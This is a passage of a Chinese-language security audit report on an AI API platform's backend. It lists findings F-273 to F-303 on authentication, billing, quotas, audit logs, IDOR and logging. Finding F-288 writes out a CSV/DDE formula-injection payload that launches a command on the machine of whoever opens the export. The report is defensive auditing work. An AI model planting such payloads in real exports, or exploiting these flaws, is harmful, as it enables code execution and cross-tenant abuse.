- **触发路径**：启用 2FA 用户 `POST /api/auth/2fa/step-up` 提交有效 TOTP，±1 step（约 90s）内重复提交同一码。
- **根因**：step-up 只用布尔 `verifyTotp` + `recordTwoFactorStepUp`，未走 `verifyTotpCounter`+`consumeTotpCounter`；登录 2FA 路径则做了消费。
- **证据**：`:3703-3709` 布尔校验；`:3844-3851` 计数器消费。
- **影响面**：实时钓鱼/肩窥的 TOTP 可反复续期 step-up，执行多次提现/敏感操作。
- **建议修法**：step-up 同样用 `verifyTotpCounter`+`consumeTotpCounter`。
- **是否当场可修**：是。

### F-273 登录风控地理数据走明文 HTTP，可被中间人篡改

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/geoip.ts:234-246`
- **触发路径**：MaxMind 未配置/未命中 → `lookup()` 回退 ip-api → 所有登录异常判定走该请求。
- **根因**：URL 硬编码 `http://`，无签名/校验，结果直接进入风控裁决。
- **证据**：`:238` `const url = \`http://ip-api.com/json/${cleanIp}?fields=...\``。
- **影响面**：同链路攻击者可伪造登录地点，压制异地告警或制造误封。
- **建议修法**：改 HTTPS 数据源；风控路径禁用明文回退或双源校验。
- **是否当场可修**：是（代码层可先去 http 回退）。

### F-274 审计链链尾按 timestamp 取，跨实例时钟偏差/同毫秒取错前驱，链分叉或误报

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/audit-log-service.ts:194-212`；校验 `apps/api/src/db/audit-queries.ts:193-203,214-230`
- **触发路径**：多实例或 NTP 回拨/同毫秒并发写入审计。
- **根因**：表无自增 seq，链序依赖实例本地毫秒时间戳；无 `(timestamp,id)` tie-breaker（id 是随机 uuid）。
- **证据**：`audit-log-service.ts:206` `ORDER BY timestamp DESC LIMIT 1`；`audit-queries.ts` 验证 `ORDER BY timestamp ASC`。
- **影响面**：先写后读可能挂错前驱，验证报「链断裂/被篡改」误报或掩盖真实分叉。
- **建议修法**：加 `seq bigserial` 并以其排序；历史按物理顺序回填。
- **是否当场可修**：需迁移。

### F-275 审计链哈希输入未覆盖 ip/user_agent/raw_retained，证据列可改写而不破坏链

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/audit-log-service.ts:145-171,225-233`；列定义 `packages/database/src/schema/audit-chain.ts:22-23,26-35`
- **触发路径**：具备 DB 写权限者修改 `audit_logs_chain.ip`/`user_agent`，或把 `raw_retained` 改 false 触发原文清理。
- **根因**：`computeAuditHash` 输入固定为 `[prevHash,timestamp,userId,action,resourceType,resourceId,result,metadata]`，不含 ip/UA/raw_retained。
- **证据**：`:152-160` payload 数组；`:225-233` INSERT 含 ip/user_agent 但未入哈希。
- **影响面**：归因可篡改、证据留存标记可绕过，链校验无感。
- **建议修法**：新增 v2 哈希含 ip/UA/raw_retained 并带版本；`raw_retained` 变更改为写新审计行。
- **是否当场可修**：需版本化兼容。

### 第十轮 D：routes 剩余

### F-276 `/v1/3d/generations` 及内部 3D 端点：平台腾讯 Key 零计费、`user_uuid` 可伪造、上游失败当成功、`activeJobs` 无界

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/v1-multimodal.ts:1946-1984`；`apps/api/src/routes/tencent-hunyuan-3d.ts:85,162-209,252-256,274-302`
- **触发路径**：API Key `POST /v1/3d/generations`（`threed:write`）→ 转发 `/api/tencent/hunyuan3d/submit`；或登录用户直调内部 submit 并自带 `user_uuid`。
- **根因**：仅 `requireApiKeyQuota`（次数窗口），无 `recordCall`/扣费/退款；`fetch` 无 signal；异常 `catch { tencentResponse = null }` 降级 stub 仍 200；`user_uuid` 取请求体；`activeJobs` 进程 Map 无 TTL/完成后不删。
- **证据**：`v1-multimodal.ts:1946` 三重 preHandler；`tencent-hunyuan-3d.ts:182` `user_uuid: parsed.data.user_uuid`；`:252-256` 裸 fetch；`:274-277` catch 置 null；`:85` `const activeJobs = new Map()`。
- **影响面**：平台承担腾讯 3D 费用可无限提交（资损）；账单归属伪造；上游挂起占用连接；内存线性增长。
- **建议修法**：成功 `recordCall`、失败退款；校验 `user_uuid === request.userId`；fetch 加 `AbortSignal.timeout(60_000)`；失败返 502 禁 stub 200；`activeJobs` 改 TTL/LRU。
- **是否当场可修**：是。

### F-277 `v1-midjourney` 与 `v1-rerank-moderations` 漏挂 `requireApiKeyQuota`，上游 `fetch` 无超时，MJ 计费失败静默

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/v1-midjourney.ts:120-130,149-168,204-214,254,320,357`；`apps/api/src/routes/v1-rerank-moderations.ts:164,187-194,216,264,281-288,310`
- **触发路径**：任意 API Key 反复调 `/v1/midjourney/imagine|upscale|variation`、`/v1/rerank`、`/v1/moderations`。
- **根因**：端点只 `requireApiKeyAuth` + 能力闸，缺 `requireApiKeyQuota()`；`fetch` 无 timeout；MJ 计费 `void recordCall(...).catch(() => {})`。
- **证据**：`v1-midjourney.ts:206-214` 仅两重 preHandler；`:121-124` 裸 fetch；`:154-168` 空 catch 计费；`v1-rerank-moderations.ts:164,264` 同。
- **影响面**：ApiKeyQuota 对最贵端点完全失效，单 Key 无限消耗平台额度；零余额先执行后扣费，欠费；上游不响应无限挂起。
- **建议修法**：补 `requireApiKeyQuota()`；统一 `AbortSignal.timeout`；计费改 `await` 或入队重试。
- **是否当场可修**：是。

### F-278 工作区 `recent-workspaces.json` 全局共享，`browse/recent` 绕过 workspace 权限

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/workspace-ai.ts:115-128,133-142,162-166`；`apps/api/src/services/workspace-ai-service.ts:3526-3543,3706-3723`
- **触发路径**：任意登录用户 `GET /api/workspace/fs/recent`、`POST /api/workspace/fs/open`、`POST /api/workspace/fs/browse`。
- **根因**：最近工作区是服务端单文件无 userId 维度；`/fs/browse` 只校验「落在登记根内」不查 `workspace_permissions`；`/fs/recent` 完全不查权限；`name` 由调用方写入。
- **证据**：`workspace-ai-service.ts:3706-3718` 全局 JSON；`:3540-3542` 仅 `isInsideRoot`；`workspace-ai.ts:162-166` 直接返回。
- **影响面**：跨租户泄漏客户项目绝对路径与目录名；伪造 name 污染他人列表；被拒 `fs.read` 的工作区仍可 browse 枚举。
- **建议修法**：recent 按 userId 分文件/落库并过滤；browse/recent 复用 `permissionManager.checkWorkspace`；name 净化。
- **是否当场可修**：是。

### F-279 `/v1/files?purpose=batch` 输入文件未与 API Key 绑定，且每请求新建 ioredis 仅成功路径 disconnect

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-public.ts:2341-2366`；`apps/api/src/routes/v1-batches.ts:288-321`；`apps/api/src/queue/batch-queue.ts:45,290-297`
- **触发路径**：Key-A 上传 batch 文件得 `file-<uuid>` → Key-B `POST /v1/batch {input_file_id}` → worker 读取该 JSONL。
- **根因**：batch 输入存全局 Redis 键 `batch:input:<fileId>`，创建 batch 只校验 shape 不校验归属；上传分支 `new IORedis` 后仅成功路径 disconnect；`buffer.toString('utf8')` 复制最多 100MB。
- **证据**：`v1-public.ts:2347-2354` 建键与 redis 生命周期；`:2364-2366` catch 直接 500；`batch-queue.ts:45` 前缀无 apiKey；`v1-batches.ts:288-321` 无归属校验。
- **影响面**：跨租户读取他人 batch 输入 prompts（配合 F-85 可读回）；异常路径连接泄漏；大对象双份内存。
- **建议修法**：键改 `batch:input:<apiKeyId>:<fileId>` 并校验归属；复用 `server.redis` 或 finally disconnect；流式写入限大小。
- **是否当场可修**：是。

### F-280 `/api/workspace/acp/*` 三端点为纯 stub：不落库却返回 201/200，`workspaceRoot` 任意且 prompt/附件正文进日志

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/workspace.ts:744-758,764-803,808-847,852-882`
- **触发路径**：登录用户 `POST /api/workspace/acp/sessions {workspaceRoot:"C:\\"}` → `.../begin-prompt` → `.../end-prompt`。
- **根因**：只 `requireAuth`；无 session 持久化/owner 校验/workspaceRoot 白名单；不存在 sessionId 也 200；`wireReq` 原样写 info 日志。
- **证据**：`:764-769` schema；`:790-803` 直接 201；`:812-847` 不查库 + `request.log.info({wireReq,...})`；`:744-758` attachments 含 content。
- **影响面**：客户端收到成功但无执行；任意路径被接受回显；prompt/附件正文入日志。
- **建议修法**：实现落库 + owner/workspaceRoot 校验，或返回 501；不存在返 404；日志只记长度与数量。
- **是否当场可修**：是。

### F-281 直播 `GET /live/channels/:id` 匿名无限刷浏览量，`/live/notify/stream-end` 免验签改指标

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/live.ts:243-248,274-278,289-298`（对照 `:302-340` 验签）
- **触发路径**：匿名循环 `GET /api/live/channels/:id`；匿名 `POST /api/live/notify/stream-end`。
- **根因**：浏览量在 GET 无条件 +1，无去重/频控；`stream-end` 未验签即调指标自增（同文件 tencent callback 有 HMAC）。
- **证据**：`:247` `incrementLiveViewCount(...)`；`:296` `recordLiveStreamDisconnected()`；`:322-340` 对照验签。
- **影响面**：热度/排行可刷高、影响推荐与结算依据；监控指标可被匿名污染误告警。
- **建议修法**：浏览量独立埋点 + Redis IP+channel 时间去重；notify 接入验签或限内网。
- **是否当场可修**：是。

### F-282 `GET /oss/download/:id` 是假下载：200 返回驱动 config，且用仅限 admin 的查询读未启用驱动

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/oss.ts:258-286`；`apps/api/src/db/oss-queries.ts:67-71`
- **触发路径**：任意登录用户 `GET /api/oss/download/<uuid>`。
- **根因**：下载代理未实现，用 `findOssDriverById`（注释写明「含 credentials 仅 admin 自动解密」）取详情并 200 返回 `config`；不校验 `isEnabled` 与 admin。
- **证据**：`oss.ts:277-283` 返回 `config` 与「请通过 /files 接口下载」；`oss-queries.ts:67-71` 注释。
- **影响面**：客户端无法区分「成功但空」与真下载；任意登录用户可读未启用驱动 config（若含密钥即泄露）。
- **建议修法**：删除或实现真实流式下载；保留元信息则 `requireAdmin` + 只返回白名单字段。
- **是否当场可修**：是。

### F-283 `POST /api/files/upload/octet` 未声明 `bodyLimit`，2MiB~100MiB 上传被全局 2MiB 静默 413

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/files.ts:703-706,801-809,833-838`；`apps/api/src/config/body-limits.ts:33`；`apps/api/tests/body-limit-regression.test.ts:206-211`
- **触发路径**：`POST /api/files/upload/octet` 请求体 2MiB~100MiB。
- **根因**：octet 由 `addContentTypeParser(..., {parseAs:'buffer'})` 接管，路由 options 无 `bodyLimit` → 继承全局 `GLOBAL_JSON_BODY_LIMIT=2MiB`，在 handler 的 100MB 校验前被拒；静态守卫只识别 multipart/schema 路由。
- **证据**：`files.ts:801-809` 仅 schema；`:833-838` handler 内校验 100MB；`body-limits.ts:33` 2MiB。
- **影响面**：2~100MB 原始流上传稳定 413，与文档/上限矛盾。
- **建议修法**：路由 options 加 `bodyLimit: FILE_UPLOAD_BODY_LIMIT`；静态守卫扩展到 raw-buffer 路由。
- **是否当场可修**：是。

### 第十轮 E：utils 剩余

### F-284 `logger.error(msg, { err })` 绕过凭据打码，`err.message` 里的 api_key 原样落盘

- **严重度**：P1
- **文件与行号**：`apps/api/src/utils/logger.ts:53-82`（`:61`）；`apps/api/src/utils/redact-credential-text.ts:88-99,121-138`；`apps/api/src/index.ts:523,540`
- **触发路径**：进程级 `uncaughtException`/启动失败 → `logger.error('...', { err })` → `log()` 只对 meta 打码，`err` 键被跳过 → pino 序列化 message/stack 含 `?api_key=sk-...`。
- **根因**：`serializeErrorFields` 对 `key === 'err'` 保留原对象；`redactCredentialStrings` 对 `Error` 原样返回；为堵洞写的 `redactErrorForLog` 在日志落盘路径从未调用。
- **证据**：`logger.ts:61` `if (key !== 'err' && value instanceof Error)`；`:82` 只打码 meta；`redact-credential-text.ts:98` `return value`；`index.ts:523` `logger.error('...', { err })`。
- **影响面**：上游/DB/HTTP 错误中的 token、api_key、Authorization 明文入日志与采集端（凭据泄露）。
- **建议修法**：`log()` 对 `meta.err instanceof Error` 用 `redactErrorForLog`。
- **是否当场可修**：是。

### F-285 工具层 4 个 Redis 客户端 `maxRetriesPerRequest: null`，Redis 故障时「降级」永不触发，WS 热路径永久挂起

- **严重度**：P1
- **文件与行号**：`apps/api/src/utils/ws-dedup.ts:42-60,78-89`；`apps/api/src/utils/ws-rate-limit.ts:51-69,96-117`；`apps/api/src/utils/ws-replay-buffer.ts:50-68,87-97`；`apps/api/src/utils/sse-state-store.ts:168-187,219-226`
- **触发路径**：`plugins/ws-chat.ts:725,837,843,853` 调这些工具；Redis 不可达时命令无限重试、Promise 永不 settle。
- **根因**：`maxRetriesPerRequest:null` + `enableOfflineQueue:true` 使命令挂起；调用方 `catch { return false/true }` 假设会 reject，实际不可达。
- **证据**：`ws-dedup.ts:45` 配置；`:84-89` set + catch；`ws-rate-limit.ts:55,114-117` 同。
- **影响面**：Redis 抖动期间每条 WS 消息处理协程卡死，连接堆积，降级失效。
- **建议修法**：设 `maxRetriesPerRequest:1~2` + `commandTimeout` 并关离线队列，或 `Promise.race` 超时。
- **是否当场可修**：是。

### F-286 SSE 旧会话收尾无条件释放「同 replayKey 的新会话」缓冲与元数据

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/sse-stream-registry.ts:236-249,257-273,309-320`；`apps/api/src/utils/sse-replay-buffer.ts:400-413`
- **触发路径**：同 `conversationId:messageId` 重复提交 → 新 session 覆盖 Map 并 abort 旧 controller → 旧请求 finally `finishSession(old)`：Map 删除有身份复核，但 `releaseStream/deleteSessionMeta` 无。
- **根因**：清理以 `replayKey` 为唯一句柄，未带 generation/对象身份；graceTimer 同样只按 key 释放。
- **证据**：`:316` Map 删除有复核；`:317-319` 无条件 release/deleteMeta；`:271` graceTimer 同。
- **影响面**：新流仍在写但缓冲被 disposed 并 60s 后删 → 重连 `known:false` 全量重生成（重复计费/内容）；跨副本 steer 失效。
- **建议修法**：`releaseStream/deleteSessionMeta` 增加 expectedOwner 复核。
- **是否当场可修**：是。

### F-287 取码配额键为 `identifier|IP`：换号即重置，与「同一 IP 换号唯一闸」自述矛盾

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/code-echo-guard.ts:137-181`；调用 `apps/api/src/routes/auth.ts:447,1368,1760`；`apps/api/src/services/sms.ts:263`
- **触发路径**：同一 IP 依次用不同手机号请求验证码，每个新号码得到全新 `echo:q:*` 计数。
- **根因**：频控维度写成联合键「标识 + IP」；注释却称其为「同一 IP 反复换号这条路径上唯一的闸」。
- **证据**：`:161` `const key = \`${identifier}|${normalizeIp(ip)}\``；`:163-166` `attempts <= 5` 放行。
- **影响面**：10 分钟窗口对换号失效，可放大到约 50 次/10 分钟/IP，短信轰炸与成本放大。
- **建议修法**：拆两把独立计数 `echo:q:ip:<ip>` 与 `echo:q:id:<identifier>`，任一超限 429；退款同步两键。
- **是否当场可修**：是。

### F-288 CSV 公式注入过滤只覆盖 `= + - @`，漏 TAB/CR/前导空白；调用方仅在含 `",\r\n` 时加引号

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/csv-utils.ts:20-25`；调用点 `apps/api/src/routes/admin/export-csv.ts:75-82`
- **触发路径**：订单备注/用户名等用户可控字段导出 CSV，值形如 `\t=cmd|' /C calc'!A0`。
- **根因**：`sanitizeCsvCell` 只看首字符四个可见符号；`escapeCsvField` 的 `/[",\r\n]/` 不含 TAB。
- **证据**：`csv-utils.ts:21-23` 四符号判断；`export-csv.ts:78` 引号条件。
- **影响面**：管理员用 Excel/WPS 打开导出文件即可能触发公式/DDE（导出即代码执行）。
- **建议修法**：去前导空白/控制字符后取首字符，触发集加 `\t\r\n`；控制字符开头一律加 `'` 并强制加引号。
- **是否当场可修**：是。

### F-289 公开边缘缓存键不含 Origin，跨源请求会命中同源建立的条目

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/public-edge-cache.ts:44-79`
- **触发路径**：同源 GET `/api/carousels`（无 Origin）→ 打 `public, s-maxage=60` 入缓存 → 桌面端带 `Origin: tauri.localhost` 请求同 URL 命中无 ACAO 的字节。
- **根因**：`isCrossOriginForEdgeCache` 只决定是否写缓存头，无法阻止跨源请求命中同源条目；缓存键缺 Origin。
- **证据**：`:76-77` 只对非跨源打 public 头；`:47-56` 注释自述实测事故。
- **影响面**：桌面端/Tauri 与网页端交替访问时 CORS 被拦（功能不可用）；反向把 tauri ACAO 喂给站点访客。
- **建议修法**：跨源场景改 `Cache-Control: private` 或 `no-store`；边缘不支持按 Origin 分键时不应开 public。
- **是否当场可修**：否（需确认边缘能力）。

### F-290 WS 限流 `MAX_PER_WINDOW=30` 是死分支，实际恒定放行到 50 条/秒

- **严重度**：P3
- **文件与行号**：`apps/api/src/utils/ws-rate-limit.ts:28-35,110-113`
- **触发路径**：已连接用户以 50 条/秒持续发消息 → `zcard` 返回 50 → 第一分支假、第二分支真，恒放行。
- **根因**：`BURST` 实现成第二个更高硬阈值而非短时突发额度；`MAX_PER_WINDOW` 比较被覆盖。
- **证据**：`:111-112` 两个 `<=` 分支；`:32-35` 常量。
- **影响面**：文档承诺 30 msg/s 实际可持续 50（超 67%），调参不生效。
- **建议修法**：改令牌桶或删除 BURST 只留 30。
- **是否当场可修**：是。

### F-291 `sse-replay-buffer.registerStream` 在 `set` 之前逐出，满 200 流时误删活跃流缓冲

- **严重度**：P3
- **文件与行号**：`apps/api/src/utils/sse-replay-buffer.ts:114-126,189-211`
- **触发路径**：已存在 200 个流时任一 `registerStream`（含已存在 key 的重新注册）→ `evictOldestStreamIfNeeded()` 先删最早条目 → 再 `set`。
- **根因**：容量判断在插入前且不区分新增/换代；逐出不看 disposed/finished，不清 `releaseTimer`。
- **证据**：`:116` `if (streams.size < MAX_STREAMS) return`；`:194-195` 先 evict 后 set；`:125` 删除不清 timer。
- **影响面**：活跃流回放缓冲被静默清空 → 重连 `known:false` 全量重生成；timer 残留持有事件对象。
- **建议修法**：仅当 `!streams.has(key)` 才淘汰；淘汰清 timer；优先淘汰 disposed。
- **是否当场可修**：是。

## 十五、第十一轮新增（v1 协议 / chat 写路径 / workspace-ai / 定价与券 / 教育账本 / utils 基建）

### A 路：v1-messages / v1-responses / chat 路由（F-292 ~ F-299）

#### F-292 `/v1/responses` 全程按 relay 计费，BYOK 用户被二次全额扣费
- 严重度：P1
- 文件与行号：`routes/v1-responses.ts:418-440`（`recordCall` 无 `mode`）、`:679-696`；对照 `routes/v1-messages.ts:466-474,488-493`；`services/relay-billing-service.ts:1081,1101-1115`
- 触发路径：用户对某 provider 配了私有 `ai_model_config` → `POST /v1/responses {model, input}` → 上游走用户私钥出网 → 回调 `recordCall(...)` 未传 `mode` → `input.mode ?? 'relay'` → 按中转站原价×倍率扣平台余额。
- 根因：v1-messages 已实现 `isByokCall()` 判定并传 `mode`/`byokMode`，v1-responses 未对齐（无该分支、无 metadata 标记）。
- 证据：`relay-billing-service.ts:1081` `const mode = input.mode ?? 'relay'`；`:1101` `else if (mode === 'byok')` 才走只收平台费分支；`v1-responses.ts:418-440` 的 `recordCall` 参数无 `mode` 字段。
- 影响面：BYOK 用户调用 Responses API 被按中转站全额计费（上游费用本由用户自付），流式与非流式均命中。
- 建议修法：与 v1-messages 对齐，调用前 `isByokCall(userId, model)` 并透传 `mode`。
- 是否当场可修：是。

#### F-293 `/v1/messages` 与 `/v1/responses` 工具调用全链路丢失
- 严重度：P2
- 文件与行号：`routes/v1-messages.ts:554-563,608-629`；`services/anthropic-adapter.ts:398-413,643-663`；`routes/v1-responses.ts:541-542,148-179,649-674`；上游 `apps/ai-service/app/routers/llm.py:5393,5166-5170`
- 触发路径：①`POST /v1/messages`（非流式）带 `tools` → 上游返回 `tool_calls` → 路由只拼 `{role:'assistant', content}`，`tool_calls` 丢弃，`finish_reason:'tool_calls'` 被映射成 `stop_reason:'tool_use'` 却无 `tool_use` block（协议非法）。②流式：上游发 `tool-call-start`/`tool-call-args-delta`，`parseUpstreamLineToOpenAIChunk` 只识别 content/token/delta.content/choices，工具帧全部返回 null。③`/v1/responses` 的 `tools` 原样塞进 Chat Completions 形状，且 `function_call` 历史项 role 未命中落成空 user 消息。
- 根因：适配器与响应构造函数支持 `tool_calls`，但上游返回的 `tool_calls` 与 SSE 工具帧从未被路由/解析器接住；Responses 侧无协议转换。
- 证据：`v1-messages.ts:614` `message: { role: 'assistant', content: data.content ?? '' }`（无 tool_calls）；`anthropic-adapter.ts:650-655` 仅 `json.content`/`json.delta.content`；`v1-responses.ts:660-665` 仅产出 `output_text`。
- 影响面：Claude SDK / Cursor / Codex 一旦使用工具即得到空回复或 502；`/v1/responses` 退化为纯文本端点。
- 建议修法：非流式填 `tool_calls`；解析器增加 tool 帧映射；Responses 侧做形状转换或对内置工具显式 400。
- 是否当场可修：是。

#### F-294 `/v1/responses` 的 `max_output_tokens` 绕过 Key 级 `maxTokensPerReq` 与 per-model TPM 预检
- 严重度：P2
- 文件与行号：`plugins/api-key-auth.ts:966-971,977-981`；`routes/v1-responses.ts:474,517-538`
- 触发路径：Key 设 `maxTokensPerReq=1000` → `POST /v1/responses {max_output_tokens:100000}` → 鉴权钩子只读 `body.max_tokens`（不存在）→ 跳过上限；TPM 估算回落默认 1000 → 100k 输出放行。
- 根因：Responses 协议字段名不同；`max_output_tokens` 到 `max_tokens` 的映射发生在鉴权之后，且 `checkMaxTokensPerReq` 全仓仅预检一处调用。
- 证据：`api-key-auth.ts:968` `typeof body.max_tokens === 'number'`；`:981` 缺省 `1000`；`v1-responses.ts:538` 才映射。
- 影响面：Key 输出上限与 per-model TPM 在 Responses 端失效，可放大单次成本/绕过限流。
- 建议修法：鉴权层同时识别 `max_output_tokens`，或在 preHandler 前归一字段；补 recordCall 后置检查。
- 是否当场可修：是。

#### F-295 `/v1/messages` 流式丢弃 `done.finishReason`，截断/内容过滤被报成 `end_turn`
- 严重度：P2
- 文件与行号：`services/anthropic-adapter.ts:643-671,367-373`；`routes/v1-messages.ts:290-306`；上游 `apps/ai-service/app/routers/llm.py:5055-5068,5251-5264`
- 触发路径：`POST /v1/messages {stream:true, max_tokens:小值}` → 上游 `event:done` 携带 `finishReason:"length"` → 解析器无该分支返回 null → 路由无条件补 `finish_reason:'stop'` → 适配器映射 `end_turn`。
- 根因：解析器只覆盖文本帧；`FINISH_REASON_MAP` 还把 `content_filter` 映射为 `end_turn`。
- 证据：`anthropic-adapter.ts:648-665` 四分支无 `finishReason`；`v1-messages.ts:301` `finish_reason: 'stop'`。
- 影响面：客户端无法得知截断或拒答，不会续写/重试；`/v1/responses` 截断一律显示 `status:"completed"`。
- 建议修法：解析 `done` 帧生成带 finish_reason 的 chunk；`content_filter` → `refusal`。
- 是否当场可修：是。

#### F-296 流式上游失败时 HTTP 200 + `[error] …` 写入正文，客户端无法识别失败
- 严重度：P2
- 文件与行号：`routes/v1-messages.ts:191-196,237-266`；`routes/v1-responses.ts:270-275,320-331,368-391`
- 触发路径：上游 5xx → 响应头已 `writeHead(200)` → `/v1/messages` 把 `[error] upstream 500: <body前200字符>` 塞进 `delta.content`；`/v1/responses` 把错误写入 `response.output_text.delta`。
- 根因：错误分支复用正常内容通道，未发协议级错误事件。
- 证据：`v1-messages.ts:247` `delta: { content: \`[error] ${streamError}\` }`；`v1-responses.ts:324-330`。
- 影响面：SDK 把错误文本当回答落库/展示；上游错误体（request-id、内部地址）回显给终端用户。
- 建议修法：改发 Anthropic `event:error` / Responses `response.failed` 并结束。
- 是否当场可修：是。

#### F-297 chat 消息编辑写路径未按会话行锁串行（版本号撞号 / edit-rerun 残留 / 投影漏计）
- 严重度：P2
- 文件与行号：`db/chat-queries.ts:1433-1484`（`editAiMessageAsVersion`）、`:1606-1658`（`editMessageAndTruncateAfter`）、`:1177-1227`（`rollHistoryProjection`）；对照 `:1255-1318`、`:1548-1596` 均有 `.for('update')`；入口 `routes/chat.ts:1589-1621,1655-1703`
- 触发路径：①并发两次 `POST /api/chat/messages/:id/edit` → 均在无锁事务外取 `max(sibling_index)` → 插入同一 `siblingIndex`。②`/edit-rerun` 与正在回调的 `/chat/stream` 并发 → 截断按 `createdAt > target` 删除，DELETE 之后落库的回复残留。③`editAiMessageAsVersion` 插入新行后不调 `rollHistoryProjection`，已收口轮次字节永久少算。
- 根因：三条消息写路径并发纪律不统一，仅 createMessage/regenerate/edit-rerun 部分加锁。
- 证据：`chat-queries.ts:1264-1268`、`:1564-1568` 有 `.for('update')`；`:1460-1464` 取 max 无锁；`:1481` 直接 insert。
- 影响面：版本菜单重复序号/错序；历史残留已作废回复；上下文压缩阈值长期偏低。
- 建议修法：`editAiMessageAsVersion` 事务 + 会话行 `FOR UPDATE`；`editMessageAndTruncateAfter` 先锁会话行；编辑后 `rollHistoryProjection(..., {reset:true})`。
- 是否当场可修：是。

#### F-298 `/compress` 把上游响应体与内部错误原文回传客户端
- 严重度：P3
- 文件与行号：`routes/chat.ts:2008-2012,2015-2016,2021-2022`（同类 `:1697-1701`）
- 触发路径：`POST /api/chat/conversations/:id/compress` → 上游非 2xx → `errText = await resp.text()` → `reply.status(502).send(error(502, \`AI service error: HTTP ${resp.status} ${errText}\`))`；fetch 异常回 `e.message`。
- 根因：未套用“固定文案 + 服务端日志”纪律。
- 证据：`:2010-2012` 无截断无脱敏；`:2016` 直接回 `e.message`。
- 影响面：普通登录用户可读取上游 provider 账号/组织/request-id/内部地址及 DB 约束错误文本。
- 建议修法：客户端只回固定文案 + 错误码，原文写 `request.log.warn`。
- 是否当场可修：是。

#### F-299 `/v1/responses` 漏挂 `requireApiKeyQuota()`，Key 级小时/天配额被绕过
- 严重度：P2
- 文件与行号：`routes/v1-responses.ts:510`；对照 `routes/v1-messages.ts:421`、`plugins/api-key-auth.ts:1166-1181`、`utils/api-key-quota.ts:35-37`
- 触发路径：任意 Key 连续 `POST /v1/responses` → preHandler 只有 `requireApiKeyAuth + responsesCapabilityGate` → `api_key_quotas` 不累加、不判 429。
- 根因：v1 面其他 LLM 端点均挂 `requireApiKeyQuota()`，此处遗漏；`requireApiKeyAuth` 只做速率窗口/TPM。
- 证据：`v1-responses.ts:510` `preHandler: [requireApiKeyAuth, responsesCapabilityGate]`；`api-key-quota.ts:35-37` 默认 1000/小时、10000/天。
- 影响面：默认配额在 Responses 端完全失效，配额统计失真。注：F-277 已报 `v1-midjourney`/`v1-rerank-moderations` 同类，本处为第三个独立修复点。
- 建议修法：preHandler 补 `requireApiKeyQuota()`。
- 是否当场可修：是。

### B 路：chat-ledger / permission-stamp / workspace-ai（F-300 ~ F-306）

#### F-300 权限档徽章的 workspacePath 取自客户端请求体，回调时才查库
- 严重度：P2
- 文件与行号：`services/message-permission-stamp.ts:48-54`；`routes/ai-chat-stream.ts:336,1417-1428`；`db/chat-queries.ts:273-279`；`routes/ai-callback.ts:341-346`
- 触发路径：用户为自己某路径建 `workspace_permissions(mode=readonly)` → `POST /api/chat/stream` 带同一 `workspacePath` + `permissionMode:"bypass-permissions"`（该值真的透传上游，即以全权档生成）→ 回调按会话 metadata 反查得 `readonly` → 助手消息打上 `readonly` 徽章。
- 根因：模块注释宣称“不接受客户端自报档位”，但档位由客户端自报的 `workspacePath` 决定；且是回调时刻的当前值而非生成时刻事实。
- 证据：`ai-chat-stream.ts:1417` `bindConversationWorkspace(conversationId, userId, workspacePath)`；`chat-queries.ts:277` 会话级 metadata 直接覆盖；`ai-callback.ts:342-345` 回调时 `getPermission`。
- 影响面：审计/回放徽章失真；同一会话并发两条流时先完成的回调会盖到后写入的 workspacePath。
- 建议修法：绑定时落不可变 `{messageId, mode, workspacePath}`，回调按键读；`workspacePath` 加登记根与长度校验。
- 是否当场可修：是。

#### F-301 `/workspace-ai/routines` 全家族无属主校验（IDOR），PATCH 接受任意字段
- 严重度：P2
- 文件与行号：`routes/workspace-ai.ts:1584-1640`；`services/workspace-ai-service.ts:3227-3293`
- 触发路径：任意登录用户 `GET /workspace-ai/routines` 获取所有人的 prompt/workspacePath/modelId/lastResult；`GET|PATCH|DELETE|POST /:id/trigger` 同样只 `requireAuth`。
- 根因：`Routine` 无 owner 字段，`list/get/update/delete/trigger` 不接收调用者身份；`PATCH` 用 `z.record(z.string(), z.unknown())` 后 `{...r, ...updates}`。
- 证据：`workspace-ai.ts:1587` `routineManager.list()`；`:1613-1616` 任意 record；`workspace-ai-service.ts:3265` `{ ...r, ...updates }`。
- 影响面：跨用户读取/篡改/删除定时任务；`trigger` 用受害者 prompt 起后台 agent（成本转嫁）；改 `nextRun` 为过去时间可每 tick 触发。
- 建议修法：`Routine` 增 `userUuid`，全部方法带 userId 过滤；PATCH 白名单 schema。
- 是否当场可修：是。

#### F-302 routine 调度器为模块级副作用，API 与 worker 各跑一份 → 同一 cron 双执行
- 严重度：P2
- 文件与行号：`services/workspace-ai-service.ts:3899-3900,3296-3299,3308-3316,3368-3371`；`index.ts:373-375`；`worker-entry.ts:33`
- 触发路径：每个进程 `buildServer()` → `routes/index.ts` → 模块体执行 `routineManager.startScheduler()`，各自 `setInterval(60_000)` 读同一份 `~/.ihui/routines.json` → 同一分钟两边都判定 `nextRun <= now` 各起一个 agent；`persist()` 整文件覆盖写，多进程并发互相覆盖。
- 根因：无 leader 选举/分布式锁/DB 认领，也不限定仅 worker 进程启动。
- 证据：`:3900` 顶层调用；`:3298` `setInterval`；`:3312-3313` `if (r.nextRun <= now) this.trigger(r.id)`；`:3370` `writeJson(...)`。
- 影响面：重复执行（重复 LLM 费用、重复外部副作用）；多副本下 routines.json 丢更新。
- 建议修法：单一角色进程启动；`nextRun` 改 DB 行级 `UPDATE ... WHERE next_run<=now RETURNING`；persist 原子写。
- 是否当场可修：是。

#### F-303 定时器回调 `persist()` 抛错未被捕获 → `uncaughtException` → `process.exit(1)`
- 严重度：P2
- 文件与行号：`services/workspace-ai-service.ts:3308-3316,3288-3291,3368-3371`；`index.ts:522-525`
